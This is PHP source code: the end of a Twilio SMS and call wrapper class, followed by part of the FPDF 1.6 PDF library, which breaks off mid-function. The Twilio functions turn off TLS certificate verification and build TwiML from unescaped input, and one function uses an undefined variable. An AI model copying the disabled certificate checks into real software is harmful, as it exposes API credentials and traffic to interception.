                		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
               		 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                		curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                		$jsonstr2 = json_decode(curl_exec($ch),true);
                		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                		curl_close($ch);	
                		//print_r($jsonstr2);
										return 'ok';	
										break;									
                	}
              	}
              	//if($result == 'ok'){
              	//	return result;	
              	//}
                //print_r(json_decode($jsonstr,true));
}

function twiliosendsms($type='json',$to,$body){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/SMS/Messages.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $to,
									"Body"  => iconv('gb2312','utf-8',$body)
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                //echo $url;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliomakecallverify($type='json',$to,$link){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $to,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Play loop='5'>".$link."</Play></Response>")
								);          			
								//echo "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Play loop='5'>".$link."</Play></Response>");
          			$header[] = "Content-length: ".strlen($postdata);                
                //echo $url;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliomakecall($type='json',$from){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $from,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$to."</Number></Dial></Response>")
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliosimplewebcall($type='json',$from,$to){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $from,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$to."</Number></Dial></Response>")
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

}
?>

<?php 
/*******************************************************************************
* FPDF                                                                         *
*                                                                              *
* Version: 1.6                                                                 *
* Date:    2008-08-03                                                          *
* Author:  Olivier PLATHEY                                                     *
*******************************************************************************/

define('FPDF_VERSION','1.6');

class FPDF
{
var $page;               //current page number
var $n;                  //current object number
var $offsets;            //array of object offsets
var $buffer;             //buffer holding in-memory PDF
var $pages;              //array containing pages
var $state;              //current document state
var $compress;           //compression flag
var $k;                  //scale factor (number of points in user unit)
var $DefOrientation;     //default orientation
var $CurOrientation;     //current orientation
var $PageFormats;        //available page formats
var $DefPageFormat;      //default page format
var $CurPageFormat;      //current page format
var $PageSizes;          //array storing non-default page sizes
var $wPt,$hPt;           //dimensions of current page in points
var $w,$h;               //dimensions of current page in user unit
var $lMargin;            //left margin
var $tMargin;            //top margin
var $rMargin;            //right margin
var $bMargin;            //page break margin
var $cMargin;            //cell margin
var $x,$y;               //current position in user unit
var $lasth;              //height of last printed cell
var $LineWidth;          //line width in user unit
var $CoreFonts;          //array of standard font names
var $fonts;              //array of used fonts
var $FontFiles;          //array of font files
var $diffs;              //array of encoding differences
var $FontFamily;         //current font family
var $FontStyle;          //current font style
var $underline;          //underlining flag
var $CurrentFont;        //current font info
var $FontSizePt;         //current font size in points
var $FontSize;           //current font size in user unit
var $DrawColor;          //commands for drawing color
var $FillColor;          //commands for filling color
var $TextColor;          //commands for text color
var $ColorFlag;          //indicates whether fill and text colors are different
var $ws;                 //word spacing
var $images;             //array of used images
var $PageLinks;          //array of links in pages
var $links;              //array of internal links
var $AutoPageBreak;      //automatic page breaking
var $PageBreakTrigger;   //threshold used to trigger page breaks
var $InHeader;           //flag set when processing header
var $InFooter;           //flag set when processing footer
var $ZoomMode;           //zoom display mode
var $LayoutMode;         //layout display mode
var $title;              //title
var $subject;            //subject
var $author;             //author
var $keywords;           //keywords
var $creator;            //creator
var $AliasNbPages;       //alias for total number of pages
var $PDFVersion;         //PDF version number

/*******************************************************************************
*                                                                              *
*                               Public methods                                 *
*                                                                              *
*******************************************************************************/
function FPDF($orientation='P', $unit='mm', $format='A4')
{
	//Some checks
	$this->_dochecks();
	//Initialization of properties
	$this->page=0;
	$this->n=2;
	$this->buffer='';
	$this->pages=array();
	$this->PageSizes=array();
	$this->state=0;
	$this->fonts=array();
	$this->FontFiles=array();
	$this->diffs=array();
	$this->images=array();
	$this->links=array();
	$this->InHeader=false;
	$this->InFooter=false;
	$this->lasth=0;
	$this->FontFamily='';
	$this->FontStyle='';
	$this->FontSizePt=12;
	$this->underline=false;
	$this->DrawColor='0 G';
	$this->FillColor='0 g';
	$this->TextColor='0 g';
	$this->ColorFlag=false;
	$this->ws=0;
	//Standard fonts
	$this->CoreFonts=array('courier'=>'Courier', 'courierB'=>'Courier-Bold', 'courierI'=>'Courier-Oblique', 'courierBI'=>'Courier-BoldOblique',
		'helvetica'=>'Helvetica', 'helveticaB'=>'Helvetica-Bold', 'helveticaI'=>'Helvetica-Oblique', 'helveticaBI'=>'Helvetica-BoldOblique',
		'times'=>'Times-Roman', 'timesB'=>'Times-Bold', 'timesI'=>'Times-Italic', 'timesBI'=>'Times-BoldItalic',
		'symbol'=>'Symbol', 'zapfdingbats'=>'ZapfDingbats');
	//Scale factor
	if($unit=='pt')
		$this->k=1;
	elseif($unit=='mm')
		$this->k=72/25.4;
	elseif($unit=='cm')
		$this->k=72/2.54;
	elseif($unit=='in')
		$this->k=72;
	else
		$this->Error('Incorrect unit: '.$unit);
	//Page format
	$this->PageFormats=array('a3'=>array(841.89,1190.55), 'a4'=>array(595.28,841.89), 'a5'=>array(420.94,595.28),
		'letter'=>array(612,792), 'legal'=>array(612,1008));
	if(is_string($format))
		$format=$this->_getpageformat($format);
	$this->DefPageFormat=$format;
	$this->CurPageFormat=$format;
	//Page orientation
	$orientation=strtolower($orientation);
	if($orientation=='p' || $orientation=='portrait')
	{
		$this->DefOrientation='P';
		$this->w=$this->DefPageFormat[0];
		$this->h=$this->DefPageFormat[1];
	}
	elseif($orientation=='l' || $orientation=='landscape')
	{
		$this->DefOrientation='L';
		$this->w=$this->DefPageFormat[1];
		$this->h=$this->DefPageFormat[0];
	}
	else
		$this->Error('Incorrect orientation: '.$orientation);
	$this->CurOrientation=$this->DefOrientation;
	$this->wPt=$this->w*$this->k;
	$this->hPt=$this->h*$this->k;
	//Page margins (1 cm)
	$margin=28.35/$this->k;
	$this->SetMargins($margin,$margin);
	//Interior cell margin (1 mm)
	$this->cMargin=$margin/10;
	//Line width (0.2 mm)
	$this->LineWidth=.567/$this->k;
	//Automatic page break
	$this->SetAutoPageBreak(true,2*$margin);
	//Full width display mode
	$this->SetDisplayMode('fullwidth');
	//Enable compression
	$this->SetCompression(true);
	//Set default PDF version number
	$this->PDFVersion='1.3';
}

function SetMargins($left, $top, $right=null)
{
	//Set left, top and right margins
	$this->lMargin=$left;
	$this->tMargin=$top;
	if($right===null)
		$right=$left;
	$this->rMargin=$right;
}

function SetLeftMargin($margin)
{
	//Set left margin
	$this->lMargin=$margin;
	if($this->page>0 && $this->x<$margin)
		$this->x=$margin;
}

function SetTopMargin($margin)
{
	//Set top margin
	$this->tMargin=$margin;
}

function SetRightMargin($margin)
{
	//Set right margin
	$this->rMargin=$margin;
}

function SetAutoPageBreak($auto, $margin=0)
{
	//Set auto page break mode and triggering margin
	$this->AutoPageBreak=$auto;
	$this->bMargin=$margin;
	$this->PageBreakTrigger=$this->h-$margin;
}

function SetDisplayMode($zoom, $layout='continuous')
{
	//Set display mode in viewer
	if($zoom=='fullpage' || $zoom=='fullwidth' || $zoom=='real' || $zoom=='default' || !is_string($zoom))
		$this->ZoomMode=$zoom;
	else
		$this->Error('Incorrect zoom display mode: '.$zoom);
	if($layout=='single' || $layout=='continuous' || $layout=='two' || $layout=='default')
		$this->LayoutMode=$layout;
	else
		$this->Error('Incorrect layout display mode: '.$layout);
}

function SetCompression($compress)
{
	//Set page compression
	if(function_exists('gzcompress'))
		$this->compress=$compress;
	else
		$this->compress=false;
}

function SetTitle($title, $isUTF8=false)
{
	//Title of document
	if($isUTF8)
		$title=$this->_UTF8toUTF16($title);
	$this->title=$title;
}

function SetSubject($subject, $isUTF8=false)
{
	//Subject of document
	if($isUTF8)
		$subject=$this->_UTF8toUTF16($subject);
	$this->subject=$subject;
}

function SetAuthor($author, $isUTF8=false)
{
	//Author of document
	if($isUTF8)
		$author=$this->_UTF8toUTF16($author);
	$this->author=$author;
}

function SetKeywords($keywords, $isUTF8=false)
{
	//Keywords of document
	if($isUTF8)
		$keywords=$this->_UTF8toUTF16($keywords);
	$this->keywords=$keywords;
}

function SetCreator($creator, $isUTF8=false)
{
	//Creator of document
	if($isUTF8)
		$creator=$this->_UTF8toUTF16($creator);
	$this->creator=$creator;
}

function AliasNbPages($alias='{nb}')
{
	//Define an alias for total number of pages
	$this->AliasNbPages=$alias;
}

function Error($msg)
{
	//Fatal error
	die('<b>FPDF error:</b> '.$msg);
}

function Open()
{
	//Begin document
	$this->state=1;
}

function Close()
{
	//Terminate document
	if($this->state==3)
		return;
	if($this->page==0)
		$this->AddPage();
	//Page footer
	$this->InFooter=true;
	$this->Footer();
	$this->InFooter=false;
	//Close page
	$this->_endpage();
	//Close document
	$this->_enddoc();
}

function AddPage($orientation='', $format='')
{
	//Start a new page
	if($this->state==0)
		$this->Open();
	$family=$this->FontFamily;
	$style=$this->FontStyle.($this->underline ? 'U' : '');
	$size=$this->FontSizePt;
	$lw=$this->LineWidth;
	$dc=$this->DrawColor;
	$fc=$this->FillColor;
	$tc=$this->TextColor;
	$cf=$this->ColorFlag;
	if($this->page>0)
	{
		//Page footer
		$this->InFooter=true;
		$this->Footer();
		$this->InFooter=false;
		//Close page
		$this->_endpage();
	}
	//Start new page
	$this->_beginpage($orientation,$format);
	//Set line cap style to square
	$this->_out('2 J');
	//Set line width
	$this->LineWidth=$lw;
	$this->_out(sprintf('%.2F w',$lw*$this->k));
	//Set font
	if($family)
		$this->SetFont($family,$style,$size);
	//Set colors
	$this->DrawColor=$dc;
	if($dc!='0 G')
		$this->_out($dc);
	$this->FillColor=$fc;
	if($fc!='0 g')
		$this->_out($fc);
	$this->TextColor=$tc;
	$this->ColorFlag=$cf;
	//Page header
	$this->InHeader=true;
	$this->Header();
	$this->InHeader=false;
	//Restore line width
	if($this->LineWidth!=$lw)
	{
		$this->LineWidth=$lw;
		$this->_out(sprintf('%.2F w',$lw*$this->k));
	}
	//Restore font
	if($family)
		$this->SetFont($family,$style,$size);
	//Restore colors
	if($this->DrawColor!=$dc)
	{
		$this->DrawColor=$dc;
		$this->_out($dc);
	}
	if($this->FillColor!=$fc)
	{
		$this->FillColor=$fc;
		$this->_out($fc);
	}
	$this->TextColor=$tc;
	$this->ColorFlag=$cf;
}

function Header()
{
	//To be implemented in your own inherited class
}

function Footer()
{
	//To be implemented in your own inherited class
}

function PageNo()
{
	//Get current page number
	return $this->page;
}

function SetDrawColor($r, $g=null, $b=null)
{
	//Set color for all stroking operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->DrawColor=sprintf('%.3F G',$r/255);
	else
		$this->DrawColor=sprintf('%.3F %.3F %.3F RG',$r/255,$g/255,$b/255);
	if($this->page>0)
		$this->_out($this->DrawColor);
}

function SetFillColor($r, $g=null, $b=null)
{
	//Set color for all filling operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->FillColor=sprintf('%.3F g',$r/255);
	else
		$this->FillColor=sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag=($this->FillColor!=$this->TextColor);
	if($this->page>0)
		$this->_out($this->FillColor);
}

function SetTextColor($r, $g=null, $b=null)
{
	//Set color for text
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->TextColor=sprintf('%.3F g',$r/255);
	else
		$this->TextColor=sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag=($this->FillColor!=$this->TextColor);
}

function GetStringWidth($s)
{
	//Get width of a string in the current font
	$s=(string)$s;
	$cw=&$this->CurrentFont['cw'];
	$w=0;
	$l=strlen($s);
	for($i=0;$i<$l;$i++)
		$w+=$cw[$s[$i]];
	return $w*$this->FontSize/1000;
}

function SetLineWidth($width)
{
	//Set line width
	$this->LineWidth=$width;
	if($this->page>0)
		$this->_out(sprintf('%.2F w',$width*$this->k));
}

function Line($x1, $y1, $x2, $y2)
{
	//Draw a line
	$this->_out(sprintf('%.2F %.2F m %.2F %.2F l S',$x1*$this->k,($this->h-$y1)*$this->k,$x2*$this->k,($this->h-$y2)*$this->k));
}

function Rect($x, $y, $w, $h, $style='')
{
	//Draw a rectangle
	if($style=='F')
		$op='f';
	elseif($style=='FD' || $style=='DF')
		$op='B';
	else
		$op='S';
	$this->_out(sprintf('%.2F %.2F %.2F %.2F re %s',$x*$this->k,($this->h-$y)*$this->k,$w*$this->k,-$h*$this->k,$op));
}

function AddFont($family, $style='', $file='')
{
	//Add a TrueType or Type1 font
	$family=strtolower($family);
	if($file=='')
		$file=str_replace(' ','',$family).strtolower($style).'.php';
	if($family=='arial')
		$family='helvetica';
	$style=strtoupper($style);
	if($style=='IB')
		$style='BI';
	$fontkey=$family.$style;
	if(isset($this->fonts[$fontkey]))
		return;
	include($this->_getfontpath().$file);
	if(!isset($name))
		$this->Error('Could not include font definition file');
	$i=count($this->fonts)+1;
	$this->fonts[$fontkey]=array('i'=>$i, 'type'=>$type, 'name'=>$name, 'desc'=>$desc, 'up'=>$up, 'ut'=>$ut, 'cw'=>$cw, 'enc'=>$enc, 'file'=>$file);
	if($diff)
	{
		//Search existing encodings
		$d=0;
		$nb=count($this->diffs);
		for($i=1;$i<=$nb;$i++)
		{
			if($this->diffs[$i]==$diff)
			{
				$d=$i;
				break;
			}
		}
		if($d==0)
		{
			$d=$nb+1;
			$this->diffs[$d]=$diff;
		}
		$this->fonts[$fontkey]['diff']=$d;
	}
	if($file)
	{
		if($type=='TrueType')
			$this->FontFiles[$file]=array('length1'=>$originalsize);
		else
			$this->FontFiles[$file]=array('length1'=>$size1, 'length2'=>$size2);
	}
}

function SetFont($family, $style='', $size=0)
{
	//Select a font; size given in points
	global $fpdf_charwidths;

	$family=strtolower($family);
	if($family=='')
		$family=$this->FontFamily;
	if($family=='arial')
		$family='helvetica';
	elseif($family=='symbol' || $family=='zapfdingbats')
		$style='';
	$style=strtoupper($style);
	if(strpos($style,'U')!==false)
	{
		$this->underline=true;
		$style=str_replace('U','',$style);
	}
	else
		$this->underline=false;
	if($style=='IB')
		$style='BI';
	if($size==0)
		$size=$this->FontSizePt;
	//Test if font is already selected
	if($this->FontFamily==$family && $this->FontStyle==$style && $this->FontSizePt==$size)
		return;
	//Test if used for the first time
	$fontkey=$family.$style;
	if(!isset($this->fonts[$fontkey]))
	{
		//Check if one of the standard fonts
		if(isset($this->CoreFonts[$fontkey]))
		{
			if(!isset($fpdf_charwidths[$fontkey]))
			{
				//Load metric file
				$file=$family;
				if($family=='times' || $family=='helvetica')
					$file.=strtolower($style);
				include($this->_getfontpath().$file.'.php');
				if(!isset($fpdf_charwidths[$fontkey]))
					$this->Error('Could not include font metric file');
			}
			$i=count($this->fonts)+1;
			$name=$this->CoreFonts[$fontkey];
			$cw=$fpdf_charwidths[$fontkey];
			$this->fonts[$fontkey]=array('i'=>$i, 'type'=>'core', 'name'=>$name, 'up'=>-100, 'ut'=>50, 'cw'=>$cw);
		}
		else
			$this->Error('Undefined font: '.$family.' '.$style);
	}
	//Select it
	$this->FontFamily=$family;
	$this->FontStyle=$style;
	$this->FontSizePt=$size;
	$this->FontSize=$size/$this->k;
	$this->CurrentFont=&$this->fonts[$fontkey];
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function SetFontSize($size)
{
	//Set font size in points
	if($this->FontSizePt==$size)
		return;
	$this->FontSizePt=$size;
	$this->FontSize=$size/$this->k;
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function AddLink()
{
	//Create a new internal link
	$n=count($this->links)+1;
	$this->links[$n]=array(0, 0);
	return $n;
}

function SetLink($link, $y=0, $page=-1)
{
	//Set destination of internal link
	if($y==-1)
		$y=$this->y;
	if($page==-1)
		$page=$this->page;
	$this->links[$link]=array($page, $y);
}

function Link($x, $y, $w, $h, $link)
{
	//Put a link on the page
	$this->PageLinks[$this->page][]=array($x*$this->k, $this->hPt-$y*$this->k, $w*$this->k, $h*$this->k, $link);
}

function Text($x, $y, $txt)
{
	//Output a string
	$s=sprintf('BT %.2F %.2F Td (%s) Tj ET',$x*$this->k,($this->h-$y)*$this->k,$this->_escape($txt));
	if($this->underline && $txt!='')
		$s.=' '.$this->_dounderline($x,$y,$txt);
	if($this->ColorFlag)
		$s='q '.$this->TextColor.' '.$s.' Q';
	$this->_out($s);
}

function AcceptPageBreak()
{
	//Accept automatic page break or not
	return $this->AutoPageBreak;
}

function Cell($w, $h=0, $txt='', $border=0, $ln=0, $align='', $fill=false, $link='')
{
	//Output a cell
	$k=$this->k;
	if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
	{
		//Automatic page break
		$x=$this->x;
		$ws=$this->ws;
		if($ws>0)
		{
			$this->ws=0;
			$this->_out('0 Tw');
		}
		$this->AddPage($this->CurOrientation,$this->CurPageFormat);
		$this->x=$x;
		if($ws>0)
		{
			$this->ws=$ws;
			$this->_out(sprintf('%.3F Tw',$ws*$k));
		}
	}
	if($w==0)
		$w=$this->w-$this->rMargin-$this->x;
	$s='';
	if($fill || $border==1)
	{
		if($fill)
			$op=($border==1) ? 'B' : 'f';
		else
			$op='S';
		$s=sprintf('%.2F %.2F %.2F %.2F re %s ',$this->x*$k,($this->h-$this->y)*$k,$w*$k,-$h*$k,$op);
	}
	if(is_string($border))
	{
		$x=$this->x;
		$y=$this->y;
		if(strpos($border,'L')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,$x*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'T')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-$y)*$k);
		if(strpos($border,'R')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',($x+$w)*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'B')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-($y+$h))*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
	}
	if($txt!=='')
	{
		if($align=='R')
			$dx=$w-$this->cMargin-$this->GetStringWidth($txt);
		elseif($align=='C')
			$dx=($w-$this->GetStringWidth($txt))/2;
		else
			$dx=$this->cMargin;
		if($this->ColorFlag)
			$s.='q '.$this->TextColor.' ';
		$txt2=str_replace(')','\\)',str_replace('(','\\(',str_replace('\\','\\\\',$txt)));
		$s.=sprintf('BT %.2F %.2F Td (%s) Tj ET',($this->x+$dx)*$k,($this->h-($this->y+.5*$h+.3*$this->FontSize))*$k,$txt2);
		if($this->underline)
			$s.=' '.$this->_dounderline($this->x+$dx,$this->y+.5*$h+.3*$this->FontSize,$txt);
		if($this->ColorFlag)
			$s.=' Q';
		if($link)
			$this->Link($this->x+$dx,$this->y+.5*$h-.5*$this->FontSize,$this->GetStringWidth($txt),$this->FontSize,$link);
	}
	if($s)
		$this->_out($s);
	$this->lasth=$h;
	if($ln>0)
	{
		//Go to next line
		$this->y+=$h;
		if($ln==1)
			$this->x=$this->lMargin;
	}
	else
		$this->x+=$w;
}

function MultiCell($w, $h, $txt, $border=0, $align='J', $fill=false)
{
	//Output text with automatic or explicit line breaks
	$cw=&$this->CurrentFont['cw'];
	if($w==0)
		$w=$this->w-$this->rMargin-$this->x;
	$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
	$s=str_replace("\r",'',$txt);
	$nb=strlen($s);
	if($nb>0 && $s[$nb-1]=="\n")
		$nb--;
	$b=0;
	if($border)
	{
		if($border==1)
		{
			$border='LTRB';
			$b='LRT';
			$b2='LR';
		}
		else
		{
			$b2='';
			if(strpos($border,'L')!==false)
				$b2.='L';
			if(strpos($border,'R')!==false)
				$b2.='R';
			$b=(strpos($border,'T')!==false) ? $b2.'T' : $b2;
		}
	}
	$sep=-1;
	$i=0;
	$j=0;
	$l=0;
	$ns=0;
	$nl=1;
	while($i<$nb)
	{
		//Get next character
		$c=$s[$i];
		if($c=="\n")
		{
			//Explicit line break
			if($this->ws>0)
			{
				$this->ws=0;
				$this->_out('0 Tw');
			}
			$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			$i++;
			$sep=-1;
			$j=$i;
			$l=0;
			$ns=0;
			$nl++;
			if($border && $nl==2)
				$b=$b2;
			continue;
		}
		if($c==' ')
		{
			$sep=$i;
			$ls=$l;
			$ns++;
		}
		$l+=$cw[$c];
		if($l>$wmax)
		{
			//Automatic line break
			if($sep==-1)
			{
				if($i==$j)
					$i++;
				if($this->ws>0)
				{
					$this->ws=0;
					$this->_out('0 Tw');
				}
				$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			}
			else
			{
				if($align=='J')
				{
					$this->ws=($ns>1) ? ($wmax-$ls)/1000*$this->FontSize/($ns-1) : 0;
					$this->_out(sprintf('%.3F Tw',$this->ws*$this->k));
				}
				$this->Cell($w,$h,substr($s,$j,$sep-$j),$b,2,$align,$fill);
				$i=$sep+1;
			}
			$sep=-1;
			$j=$i;
			$l=0;
			$ns=0;
			$nl++;
			if($border && $nl==2)
				$b=$b2;
		}
		else
			$i++;
	}
	//Last chunk
	if($this->ws>0)
	{
		$this->ws=0;
		$this->_out('0 Tw');
	}
	if($border && strpos($border,'B')!==false)
		$b.='B';
	$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
	$this->x=$this->lMargin;
}

function Write($h, $txt, $link='')
{
	//Output text in flowing mode
	$cw=&$this->CurrentFont['cw'];
	$w=$this->w-$this->rMargin-$this->x;
	$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
	$s=str_replace("\r",'',$txt);
	$nb=strlen($s);
	$sep=-1;
	$i=0;
	$j=0;
	$l=0;
	$nl=1;
	while($i<$nb)
	{
		//Get next character
		$c=$s[$i];
		if($c=="\n")
		{
			//Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			$i++;
			$sep=-1;
			$j=$i;
			$l=0;
			if($nl==1)
			{
				$this->x=$this->lMargin;
				$w=$this->w-$this->rMargin-$this->x;
				$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
			continue;
		}
		if($c==' ')
			$sep=$i;
		$l+=$cw[$c];
		if($l>$wmax)
		{
			//Automatic line break
			if($sep==-1)
			{
				if($this->x>$this->lMargin)
				{
					//Move to next line
					$this->x=$this->lMargin;
					$this->y+=$h;
					$w=$this->w-$this->rMargin-$this->x;
					$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
					$i++;
					$nl++;
					continue;
				}
				if($i==$j)
					$i++;
				$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),0,2,'',0,$link);
				$i=$sep+1;
			}
			$sep=-1;
			$j=$i;
			$l=0;
			if($nl==1)
			{
				$this->x=$this->lMargin;
				$w=$this->w-$this->rMargin-$this->x;
				$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
		}
		else
			$i++;
	}
	//Last chunk
	if($i!=$j)
		$this->Cell($l/1000*$this->FontSize,$h,substr($s,$j),0,0,'',0,$link);
}

function Ln($h=null)
{
	//Line feed; default value is last cell height
	$this->x=$this->lMargin;
	if($h===null)
		$this->y+=$this->lasth;
	else
		$this->y+=$h;
}

function Image($file, $x=null, $y=null, $w=0, $h=0, $type='', $link='')
{
	//Put an image on the page
	if(!isset($this->images[$file]))
	{
		//First use of this image, get info
		if($type=='')
		{
			$pos=strrpos($file,'.');
			if(!$pos)
				$this->Error('Image file has no extension and no type was specified: '.$file);
			$type=substr($file,$pos+1);
		}
		$type=strtolower($type);
		if($type=='jpeg')
			$type='jpg';
		$mtd='_parse'.$type;
		if(!method_exists($this,$mtd))
			$this->Error('Unsupported image type: '.$type);
		$info=$this->$mtd($file);
		$info['i']=count($this->images)+1;
		$this->images[$file]=$info;
	}
	else
		$info=$this->images[$file];
	//Automatic width and height calculation if needed
	if($w==0 && $h==0)
	{
		//Put image at 72 dpi
		$w=$info['w']/$this->k;
		$h=$info['h']/$this->k;
	}
	elseif($w==0)
		$w=$h*$info['w']/$info['h'];
	elseif($h==0)
		$h=$w*$info['h']/$info['w'];
	//Flowing mode
	if($y===null)
	{
		if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
		{
			//Automatic page break
			$x2=$this->x;
			$this->AddPage($this->CurOrientation,$this->CurPageFormat);
			$this->x=$x2;
		}
		$y=$this->y;
		$this->y+=$h;
	}
	if($x===null)
		$x=$this->x;
	$this->_out(sprintf('q %.2F 0 0 %.2F %.2F %.2F cm /I%d Do Q',$w*$this->k,$h*$this->k,$x*$this->k,($this->h-($y+$h))*$this->k,$info['i']));
	if($link)
		$this->Link($x,$y,$w,$h,$link);
}

function GetX()
{
	//Get x position
	return $this->x;
}

function SetX($x)
{
	//Set x position
	if($x>=0)
		$this->x=$x;
	else
		$this->x=$this->w+$x;
}

function GetY()
{
	//Get y position
	return $this->y;
}

function SetY($y)
{
	//Set y position and reset x
	$this->x=$this->lMargin;
	if($y>=0)
		$this->y=$y;
	else
		$this->y=$this->h+$y;
}

function SetXY($x, $y)
{
